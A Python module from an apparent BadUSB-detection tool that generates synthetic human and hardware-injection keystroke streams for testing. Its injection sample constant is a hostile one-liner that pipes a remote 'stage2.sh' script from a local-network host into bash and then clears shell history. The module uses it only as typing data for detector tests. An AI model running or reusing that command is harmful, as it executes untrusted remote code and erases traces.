# ==============================================================================
# Product:       lh-hid-guard (lh-hid)
# Module:        src.lh_hid_guard.simulator
# Role:          Core Security Engine Component
# Organization:  Logihertz Systems (OPC) Private Limited (logihertzsystems)
# Creator:       Sameer Tawade (Creator, Founder, Director & Whole and Sole Developer)
# Contact:       ops@logihertz.com | https://logihertz.com/
# License:       Apache License 2.0 (SPDX-License-Identifier: Apache-2.0)
# ==============================================================================

"""Synthetic keystroke event log generator for testing and validation.

Generates realistic human typing streams with natural variance and thinking pauses,
as well as automated hardware keystroke injection streams with microsecond/millisecond
superhuman speeds typical of BadUSB / USB Rubber Ducky attack payloads.
"""

from __future__ import annotations

import json
import random
from pathlib import Path

from lh_hid_guard.models import KeystrokeEvent

HUMAN_SAMPLE_TEXT = (
    "git status && git log -n 5 --oneline\n"
    "cat /etc/os-release | grep PRETTY_NAME\n"
    "python3 -m unittest discover -s tests\n"
)

INJECTION_SAMPLE_PAYLOAD = (
    "curl -sSf http://192.168.1.100:8000/stage2.sh | bash -s -- --silent; history -c; exit\n"
)


def generate_human_stream(
    count: int = 100,
    start_time: float = 1700000000.0,
    seed: int | None = None,
) -> list[KeystrokeEvent]:
    """Generate a synthetic keystroke stream with authentic human typing physics.

    Human typing characteristics:
        - Mean IKI between 100ms and 180ms.
        - High natural variance (std dev > 30ms).
        - Thinking pauses between words and punctuation (250ms - 600ms).
        - No rolling window of 15 intervals drops below 8.0ms.

    Args:
        count: Number of keystrokes to generate.
        start_time: Initial epoch timestamp.
        seed: Random seed for deterministic reproducibility.

    Returns:
        List of simulated KeystrokeEvent objects.
    """
    rng = random.Random(seed)  # nosec B311
    events: list[KeystrokeEvent] = []
    current_time = start_time

    sample_chars = HUMAN_SAMPLE_TEXT
    char_len = len(sample_chars)

    for i in range(count):
        char = sample_chars[i % char_len]
        events.append(
            KeystrokeEvent(
                timestamp=round(current_time, 4),
                key=char if char != "\n" else "ENTER",
                action="press",
            )
        )

        # Baseline human typing delay (Gaussian: mean ~120ms, std ~35ms)
        delay = rng.gauss(0.125, 0.035)
        # Ensure physical human muscle actuation limits (> 35ms)
        delay = max(0.040, min(delay, 0.350))

        # Word boundaries or punctuation introduce thinking/planning pauses
        if char in (" ", "\n", "-", "&", "|"):
            pause = rng.uniform(0.150, 0.400)
            delay += pause

        current_time += delay

    return events


def generate_injection_stream(
    count: int = 100,
    start_time: float = 1700000000.0,
    seed: int | None = None,
    mean_delay_ms: float = 3.5,
) -> list[KeystrokeEvent]:
    """Generate a synthetic keystroke stream simulating automated hardware injection.

    Injection characteristics (e.g. USB Rubber Ducky, BadUSB, Teensy):
        - Mean IKI between 1.0ms and 5.0ms (far below the 8.0ms threshold).
        - Extremely low variance / jitter (std dev < 0.5ms).
        - Continuous high-speed bursts (> 200 keys/second, > 2400 WPM).

    Args:
        count: Number of keystrokes to generate.
        start_time: Initial epoch timestamp.
        seed: Random seed for deterministic reproducibility.
        mean_delay_ms: Mean delay between keystrokes in milliseconds (default: 3.5ms).

    Returns:
        List of simulated KeystrokeEvent objects.
    """
    rng = random.Random(seed)  # nosec B311
    events: list[KeystrokeEvent] = []
    current_time = start_time

    sample_chars = INJECTION_SAMPLE_PAYLOAD
    char_len = len(sample_chars)

    for i in range(count):
        char = sample_chars[i % char_len]
        events.append(
            KeystrokeEvent(
                timestamp=round(current_time, 5),
                key=char if char != "\n" else "ENTER",
                action="press",
            )
        )

        # Hardware injection timing: tight loop with minimal USB polling jitter
        delay_sec = (mean_delay_ms / 1000.0) + rng.uniform(-0.0003, 0.0003)
        delay_sec = max(0.0008, delay_sec)

        current_time += delay_sec

    return events


def simulate_events(
    profile: str = "human",
    count: int = 100,
    output_path: str | Path | None = None,
    seed: int | None = None,
) -> list[KeystrokeEvent]:
    """Generate synthetic keystroke events and optionally save to a JSON file.

    Args:
        profile: Profile name ('human' or 'injection').
        count: Number of keystrokes to simulate.
        output_path: Destination JSON file path, if saving.
        seed: Random seed for reproducibility.

    Returns:
        List of generated KeystrokeEvent objects.

    Raises:
        ValueError: If profile is not 'human' or 'injection'.
    """
    prof = profile.strip().lower()
    if prof == "human":
        events = generate_human_stream(count=count, seed=seed)
    elif prof in ("injection", "badusb", "rubberducky"):
        events = generate_injection_stream(count=count, seed=seed)
    else:
        raise ValueError(f"Invalid profile '{profile}'. Supported profiles: 'human', 'injection'.")

    if output_path:
        out_file = Path(output_path)
        out_file.parent.mkdir(parents=True, exist_ok=True)
        data = [ev.to_dict() for ev in events]
        out_file.write_text(json.dumps(data, indent=2), encoding="utf-8")

    return events
